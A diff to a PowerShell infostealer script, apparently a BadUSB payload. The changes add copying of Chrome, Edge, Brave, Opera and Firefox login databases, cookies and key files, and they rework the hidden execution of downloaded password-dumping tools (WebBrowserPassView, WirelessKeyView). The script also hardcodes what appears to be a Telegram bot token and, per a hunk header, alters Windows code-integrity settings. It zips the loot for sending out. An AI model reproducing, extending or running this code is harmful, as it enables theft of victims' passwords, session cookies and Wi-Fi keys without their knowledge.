@@ -1,8 +1,7 @@
 [CmdletBinding()]
 param(
     [string]$Token,
-    [string]$ChatID,
-    [int]$HistoryDays = 7
+    [string]$ChatID
 )
 
 if (-not $Token)  { $Token  = '9144321837:AAHrcLLsQqlZGQNXFdry99NnBKfTIHLCK90' }
@@ -56,10 +55,9 @@ Set-ItemProperty $ciKey -Name VerifiedAndReputablePolicyState -Type DWord -Value
 & CiTool --refresh --json | Out-Null
 
 $tools = [ordered]@{
-  'WirelessKeyView.exe'     = 'https://github.com/tuconnaisyouknow/BadUSB_passStealer/raw/main/other_files/WirelessKeyView.exe'
-  'WebBrowserPassView.exe'  = 'https://github.com/tuconnaisyouknow/BadUSB_passStealer/raw/main/other_files/WebBrowserPassView.exe'
-  'BrowsingHistoryView.exe' = 'https://github.com/tuconnaisyouknow/BadUSB_passStealer/raw/main/other_files/BrowsingHistoryView.exe'
-  'WNetWatcher.exe'         = 'https://github.com/tuconnaisyouknow/BadUSB_passStealer/raw/main/other_files/WNetWatcher.exe'
+  'WirelessKeyView.exe'    = 'https://github.com/tuconnaisyouknow/BadUSB_passStealer/raw/main/other_files/WirelessKeyView.exe'
+  'WebBrowserPassView.exe' = 'https://github.com/tuconnaisyouknow/BadUSB_passStealer/raw/main/other_files/WebBrowserPassView.exe'
+  'WNetWatcher.exe'        = 'https://github.com/tuconnaisyouknow/BadUSB_passStealer/raw/main/other_files/WNetWatcher.exe'
 }
 foreach ($t in $tools.Keys) {
   $dst = Join-Path $basePath $t
@@ -69,11 +67,54 @@ foreach ($t in $tools.Keys) {
   }
 }
 
+$browserDir = Join-Path $basePath 'browsers'
+New-Item -ItemType Directory -Path $browserDir -Force | Out-Null
+$browsers = @(
+  @{ n='chrome'; p="$env:LOCALAPPDATA\Google\Chrome\User Data" },
+  @{ n='edge';   p="$env:LOCALAPPDATA\Microsoft\Edge\User Data" },
+  @{ n='brave';  p="$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data" },
+  @{ n='opera';  p="$env:APPDATA\Opera Software\Opera Stable" }
+)
+foreach ($b in $browsers) {
+  if (-not (Test-Path $b.p)) { continue }
+  $ls = Join-Path $b.p 'Local State'
+  if (Test-Path $ls) { Copy-Item $ls (Join-Path $browserDir ($b.n + '_LocalState.json')) -Force -ErrorAction SilentlyContinue }
+  Get-ChildItem $b.p -Directory -ErrorAction SilentlyContinue |
+    Where-Object { $_.Name -eq 'Default' -or $_.Name -like 'Profile*' } | ForEach-Object {
+      foreach ($f in 'Login Data','Web Data','Cookies') {
+        $src = Join-Path $_.FullName $f
+        if (Test-Path $src) { Copy-Item $src (Join-Path $browserDir ("{0}_{1}_{2}" -f $b.n,$_.Name,($f -replace ' ',''))) -Force -ErrorAction SilentlyContinue }
+      }
+    }
+}
+$ff = "$env:APPDATA\Mozilla\Firefox\Profiles"
+if (Test-Path $ff) {
+  Get-ChildItem $ff -Directory -ErrorAction SilentlyContinue | ForEach-Object {
+    foreach ($f in 'logins.json','key4.db','cookies.sqlite') {
+      $src = Join-Path $_.FullName $f
+      if (Test-Path $src) { Copy-Item $src (Join-Path $browserDir ("firefox_{0}_{1}" -f $_.Name,$f)) -Force -ErrorAction SilentlyContinue }
+    }
+  }
+}
+S "browser dbs: $((Get-ChildItem $browserDir -File -ErrorAction SilentlyContinue).Count)"
+
+$devOut = Join-Path $basePath 'connected_devices.txt'
+@(
+  '=== arp -a ==='
+  (arp -a 2>$null)
+  '=== Get-NetNeighbor ==='
+  (Get-NetNeighbor -ErrorAction SilentlyContinue | Format-Table -AutoSize | Out-String)
+  '=== adapters ==='
+  (Get-NetAdapter -ErrorAction SilentlyContinue | Format-Table Name,InterfaceDescription,MacAddress,Status,LinkSpeed -AutoSize | Out-String)
+  '=== ipconfig /all ==='
+  (ipconfig /all 2>$null)
+) | Out-File -Encoding utf8 $devOut
+S "devices file: $((Get-Item $devOut).Length) bytes"
+
 $jobs = @(
-  @{ exe='WNetWatcher.exe';         args=@('/stext','connected_devices.txt'); wait=10 },
-  @{ exe='BrowsingHistoryView.exe'; args=@('/HistorySource','1','/VisitTimeFilterType','2','/VisitTimeFilterNumberOfDays',"$HistoryDays",'/stext','history.txt'); wait=30 },
-  @{ exe='WebBrowserPassView.exe';  args=@('/stext','passwords.txt'); wait=25 },
-  @{ exe='WirelessKeyView.exe';     args=@('/stext','wifi.txt'); wait=20 }
+  @{ exe='WNetWatcher.exe';        args=@('/stext','net_scan.txt'); wait=25 },
+  @{ exe='WebBrowserPassView.exe'; args=@('/LoadPasswordsChrome','1','/LoadPasswordsEdge','1','/LoadPasswordsFirefox','1','/LoadPasswordsIE','1','/stext','passwords.txt'); wait=25 },
+  @{ exe='WirelessKeyView.exe';    args=@('/stext','wifi.txt'); wait=20 }
 )
 
 foreach ($j in $jobs) {
@@ -84,17 +125,18 @@ foreach ($j in $jobs) {
   try { Start-Process -FilePath $exe -ArgumentList $j.args -WorkingDirectory $basePath -WindowStyle Hidden } catch { S ("start FAIL " + $_.Exception.Message) }
   $n = 0
   while ($n -lt $j.wait -and -not (Test-Path $out)) { Start-Sleep 1; $n++ }
-  Start-Sleep 2
+  Start-Sleep 3
   Get-Process -Name ([IO.Path]::GetFileNameWithoutExtension($j.exe)) -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
-  S "done $($j.exe) out=$(Test-Path $out)"
+  if (Test-Path $out) { S "done $($j.exe) bytes=$((Get-Item $out).Length)" } else { S "done $($j.exe) NO OUTPUT" }
 }
 
-$files = 'passwords.txt','wifi.txt','connected_devices.txt','history.txt' |
+$files = 'passwords.txt','wifi.txt','connected_devices.txt','net_scan.txt' |
          ForEach-Object { Join-Path $basePath $_ } | Where-Object { Test-Path $_ -PathType Leaf }
 S "files: $($files -join ', ')"
 if (-not $files) { S 'NO FILES'; Read-Host 'Enter'; exit 1 }
 
 Move-Item $files -Destination $dumpFolder -Force -ErrorAction SilentlyContinue
+Move-Item $browserDir -Destination $dumpFolder -Force -ErrorAction SilentlyContinue
 Compress-Archive -Path (Join-Path $dumpFolder '*') -DestinationPath $dumpFile -Force -ErrorAction SilentlyContinue
 S "zip=$(Test-Path $dumpFile)"
 if (-not (Test-Path $dumpFile)) { S 'NO ZIP'; Read-Host 'Enter'; exit 1 }
